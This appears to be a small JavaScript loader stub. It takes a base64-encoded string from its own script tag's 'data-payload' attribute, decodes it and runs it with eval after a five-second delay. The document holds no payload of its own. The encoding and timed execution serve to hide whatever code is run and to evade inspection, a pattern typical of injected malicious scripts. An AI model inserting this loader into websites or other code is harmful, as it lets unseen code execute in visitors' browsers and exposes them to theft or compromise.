(function () {
  var script = document.currentScript;
  if (!script) return;

  var payload = script.getAttribute("data-payload");
  if (!payload) return;

  setTimeout(function () {
    eval(atob(payload));
  }, 5000);
})();
